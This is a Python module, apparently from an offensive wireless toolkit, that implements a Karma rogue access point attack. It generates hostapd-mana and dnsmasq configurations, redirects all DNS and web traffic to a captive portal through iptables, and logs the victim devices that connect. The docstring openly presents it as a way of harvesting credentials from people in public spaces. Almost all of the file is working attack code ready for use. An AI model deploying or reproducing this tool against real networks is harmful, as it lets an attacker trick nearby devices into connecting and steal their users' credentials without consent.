"""
Karma Attack - Automatic SSID response for client association.

The Karma attack exploits the WiFi probe request/response mechanism:
1. Clients constantly probe for their known networks (PNL)
2. Karma responds to ALL probes saying "yes, I'm that network!"
3. Clients connect thinking it's their trusted network
4. Traffic flows through attacker → credential capture

Combined with captive portal, this is extremely effective for
harvesting credentials in public spaces.

Requires: hostapd (with karma patch) or hostapd-mana
"""

from __future__ import annotations

import asyncio
import logging
from dataclasses import dataclass, field
from datetime import UTC, datetime
from enum import Enum
from pathlib import Path
from typing import Any

logger = logging.getLogger(__name__)


class KarmaMode(str, Enum):
    """Karma operation modes."""
    RESPOND_ALL = "respond_all"      # Respond to all probe requests
    RESPOND_LIST = "respond_list"    # Only respond to SSIDs in list
    RESPOND_CAPTURED = "captured"    # Respond to SSIDs seen in probes


@dataclass
class KarmaConfig:
    """Karma attack configuration."""
    
    interface: str = "wlan0"
    channel: int = 6
    
    # Karma mode
    mode: KarmaMode = KarmaMode.RESPOND_ALL
    
    # SSID list (for RESPOND_LIST mode)
    ssid_list: list[str] = field(default_factory=list)
    
    # Captive portal
    enable_portal: bool = True
    portal_template: str = "generic"
    
    # DHCP
    dhcp_range_start: str = "192.168.4.100"
    dhcp_range_end: str = "192.168.4.200"
    gateway: str = "192.168.4.1"
    
    # Logging
    log_dir: Path = field(default_factory=lambda: Path("logs/karma"))
    
    # Limits
    max_clients: int = 50
    beacon_interval: int = 100  # ms
    
    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary."""
        return {
            "interface": self.interface,
            "channel": self.channel,
            "mode": self.mode.value,
            "ssid_list": self.ssid_list,
            "enable_portal": self.enable_portal,
            "gateway": self.gateway,
        }


@dataclass
class KarmaStats:
    """Karma attack statistics."""
    
    started_at: datetime | None = None
    clients_connected: int = 0
    clients_total: int = 0
    ssids_responded: int = 0
    credentials_captured: int = 0
    
    # Per-SSID stats
    ssid_connections: dict[str, int] = field(default_factory=dict)
    
    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary."""
        return {
            "started_at": self.started_at.isoformat() if self.started_at else None,
            "clients_connected": self.clients_connected,
            "clients_total": self.clients_total,
            "ssids_responded": self.ssids_responded,
            "credentials_captured": self.credentials_captured,
            "top_ssids": dict(sorted(
                self.ssid_connections.items(),
                key=lambda x: x[1],
                reverse=True
            )[:10]),
        }


@dataclass
class ConnectedClient:
    """A client connected to Karma AP."""
    
    mac: str
    ip: str = ""
    ssid: str = ""  # Which SSID they connected for
    connected_at: datetime = field(default_factory=lambda: datetime.now(UTC))
    hostname: str = ""
    vendor: str | None = None
    
    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary."""
        return {
            "mac": self.mac,
            "ip": self.ip,
            "ssid": self.ssid,
            "hostname": self.hostname,
            "vendor": self.vendor,
            "connected_at": self.connected_at.isoformat(),
        }


class KarmaAttack:
    """
    Karma Attack - Respond to client probes to capture connections.
    
    This attack creates a rogue AP that responds to probe requests
    with matching SSIDs, tricking clients into connecting.
    
    Usage:
        karma = KarmaAttack(config)
        await karma.start()
        
        # Clients will automatically connect
        clients = karma.get_connected_clients()
        
        await karma.stop()
    """
    
    def __init__(self, config: KarmaConfig | None = None):
        self.config = config or KarmaConfig()
        
        self._running = False
        self._process: asyncio.subprocess.Process | None = None
        self._dnsmasq_process: asyncio.subprocess.Process | None = None
        
        # State
        self._clients: dict[str, ConnectedClient] = {}
        self._responded_ssids: set[str] = set()
        self._stats = KarmaStats()
        
        # Hostapd config path
        self._hostapd_conf = Path("/tmp/momo_karma_hostapd.conf")
        self._dnsmasq_conf = Path("/tmp/momo_karma_dnsmasq.conf")
    
    @property
    def is_running(self) -> bool:
        return self._running
    
    async def start(self) -> bool:
        """Start Karma attack."""
        if self._running:
            logger.warning("Karma already running")
            return True
        
        self.config.log_dir.mkdir(parents=True, exist_ok=True)
        
        try:
            # Generate hostapd config with karma support
            await self._generate_hostapd_conf()
            
            # Start hostapd
            self._process = await asyncio.create_subprocess_exec(
                "hostapd", str(self._hostapd_conf),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            
            await asyncio.sleep(1)
            
            if self._process.returncode is not None:
                stderr = await self._process.stderr.read() if self._process.stderr else b""
                logger.error("hostapd failed: %s", stderr.decode())
                return False
            
            # Configure interface IP
            await self._setup_interface()
            
            # Start dnsmasq for DHCP
            await self._start_dnsmasq()
            
            # Setup iptables for captive portal
            if self.config.enable_portal:
                await self._setup_iptables()
            
            self._running = True
            self._stats.started_at = datetime.now(UTC)
            
            # Start client monitor
            _ = asyncio.create_task(self._monitor_clients())
            
            logger.info("Karma attack started on %s channel %d",
                       self.config.interface, self.config.channel)
            
            return True
            
        except FileNotFoundError as e:
            logger.error("Required tool not found: %s", e)
            return False
        except Exception as e:
            logger.error("Karma start error: %s", e)
            await self.stop()
            return False
    
    async def stop(self) -> None:
        """Stop Karma attack."""
        self._running = False
        
        # Stop hostapd
        if self._process and self._process.returncode is None:
            self._process.terminate()
            try:
                await asyncio.wait_for(self._process.wait(), timeout=5.0)
            except TimeoutError:
                self._process.kill()
        
        # Stop dnsmasq
        if self._dnsmasq_process and self._dnsmasq_process.returncode is None:
            self._dnsmasq_process.terminate()
            try:
                await asyncio.wait_for(self._dnsmasq_process.wait(), timeout=5.0)
            except TimeoutError:
                self._dnsmasq_process.kill()
        
        # Cleanup iptables
        await self._cleanup_iptables()
        
        # Cleanup temp files
        for f in [self._hostapd_conf, self._dnsmasq_conf]:
            try:
                f.unlink(missing_ok=True)
            except Exception:
                pass
        
        logger.info("Karma attack stopped")
    
    async def _generate_hostapd_conf(self) -> None:
        """Generate hostapd configuration with karma support."""
        
        # Note: Standard hostapd doesn't support karma
        # You need hostapd-mana or hostapd with karma patch
        # This generates a config that works with hostapd-mana
        
        ssid = "FreeWiFi"  # Default SSID for beacon
        if self.config.ssid_list:
            ssid = self.config.ssid_list[0]
        
        config = f"""# MoMo Karma Attack Configuration
interface={self.config.interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={self.config.channel}
beacon_int={self.config.beacon_interval}

# Open network (no encryption for karma)
auth_algs=1
wpa=0

# Karma mode - respond to all probes
# Note: Requires hostapd-mana or patched hostapd
# mana_wpaout=/tmp/momo_karma_wpa.log
# mana_loud=1
# mana_macacl=0

# Enable karma (respond to all probe requests with matching SSID)
# karma=1

# Log probes
# mana_probes=1

# Client limits
max_num_sta={self.config.max_clients}

# Logging
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2
"""
        
        self._hostapd_conf.write_text(config)
    
    async def _setup_interface(self) -> None:
        """Setup network interface with IP."""
        gateway = self.config.gateway
        
        # Set interface IP
        proc = await asyncio.create_subprocess_exec(
            "ip", "addr", "add", f"{gateway}/24", "dev", self.config.interface,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        await proc.wait()
        
        # Bring interface up
        proc = await asyncio.create_subprocess_exec(
            "ip", "link", "set", self.config.interface, "up",
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        await proc.wait()
    
    async def _start_dnsmasq(self) -> None:
        """Start dnsmasq for DHCP and DNS."""
        
        config = f"""# MoMo Karma DHCP Configuration
interface={self.config.interface}
bind-interfaces
dhcp-range={self.config.dhcp_range_start},{self.config.dhcp_range_end},12h
dhcp-option=3,{self.config.gateway}
dhcp-option=6,{self.config.gateway}

# Redirect all DNS to captive portal
address=/#/{self.config.gateway}

# Logging
log-queries
log-dhcp
"""
        
        self._dnsmasq_conf.write_text(config)
        
        self._dnsmasq_process = await asyncio.create_subprocess_exec(
            "dnsmasq", "-C", str(self._dnsmasq_conf), "-d",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        
        await asyncio.sleep(0.5)
    
    async def _setup_iptables(self) -> None:
        """Setup iptables for captive portal redirect."""
        gateway = self.config.gateway
        
        rules = [
            # Enable NAT
            ["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", "eth0", "-j", "MASQUERADE"],
            # Redirect HTTP to captive portal
            ["iptables", "-t", "nat", "-A", "PREROUTING", "-i", self.config.interface,
             "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", f"{gateway}:80"],
            # Redirect HTTPS
            ["iptables", "-t", "nat", "-A", "PREROUTING", "-i", self.config.interface,
             "-p", "tcp", "--dport", "443", "-j", "DNAT", "--to-destination", f"{gateway}:80"],
        ]
        
        for rule in rules:
            proc = await asyncio.create_subprocess_exec(
                *rule,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.DEVNULL,
            )
            await proc.wait()
    
    async def _cleanup_iptables(self) -> None:
        """Remove iptables rules."""
        # Flush NAT table rules for our interface
        proc = await asyncio.create_subprocess_exec(
            "iptables", "-t", "nat", "-F",
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        await proc.wait()
    
    async def _monitor_clients(self) -> None:
        """Monitor connected clients via DHCP leases."""
        lease_file = Path("/var/lib/misc/dnsmasq.leases")
        
        while self._running:
            try:
                if lease_file.exists():
                    leases = lease_file.read_text()
                    self._parse_leases(leases)
            except Exception as e:
                logger.debug("Lease parse error: %s", e)
            
            await asyncio.sleep(5)
    
    def _parse_leases(self, leases: str) -> None:
        """Parse dnsmasq lease file."""
        for line in leases.splitlines():
            parts = line.split()
            if len(parts) >= 4:
                # Format: timestamp mac ip hostname *
                mac = parts[1].upper()
                ip = parts[2]
                hostname = parts[3] if parts[3] != "*" else ""
                
                if mac not in self._clients:
                    client = ConnectedClient(
                        mac=mac,
                        ip=ip,
                        hostname=hostname,
                    )
                    self._clients[mac] = client
                    self._stats.clients_total += 1
                    self._stats.clients_connected += 1
                    
                    logger.info("Client connected: %s (%s) - %s",
                              mac, ip, hostname)
    
    def add_ssid(self, ssid: str) -> None:
        """Add SSID to response list."""
        if ssid not in self.config.ssid_list:
            self.config.ssid_list.append(ssid)
            self._responded_ssids.add(ssid)
            self._stats.ssids_responded = len(self._responded_ssids)
    
    def get_connected_clients(self) -> list[ConnectedClient]:
        """Get all connected clients."""
        return list(self._clients.values())
    
    def get_stats(self) -> dict[str, Any]:
        """Get attack statistics."""
        return self._stats.to_dict()
    
    def get_metrics(self) -> dict[str, Any]:
        """Get Prometheus-compatible metrics."""
        return {
            "momo_karma_clients_connected": self._stats.clients_connected,
            "momo_karma_clients_total": self._stats.clients_total,
            "momo_karma_ssids_responded": self._stats.ssids_responded,
            "momo_karma_credentials_captured": self._stats.credentials_captured,
        }


class MockKarmaAttack(KarmaAttack):
    """Mock Karma attack for testing."""
    
    async def start(self) -> bool:
        """Mock start."""
        self._running = True
        self._stats.started_at = datetime.now(UTC)
        
        # Add some mock clients
        self._clients["AA:BB:CC:DD:EE:01"] = ConnectedClient(
            mac="AA:BB:CC:DD:EE:01",
            ip="192.168.4.101",
            ssid="OfficeWiFi",
            hostname="iPhone-John",
        )
        self._clients["AA:BB:CC:DD:EE:02"] = ConnectedClient(
            mac="AA:BB:CC:DD:EE:02",
            ip="192.168.4.102",
            ssid="HomeNetwork",
            hostname="Galaxy-S21",
        )
        
        self._stats.clients_connected = 2
        self._stats.clients_total = 2
        self._stats.ssids_responded = 5
        
        logger.info("MockKarmaAttack started")
        return True
    
    async def stop(self) -> None:
        """Mock stop."""
        self._running = False
        logger.info("MockKarmaAttack stopped")

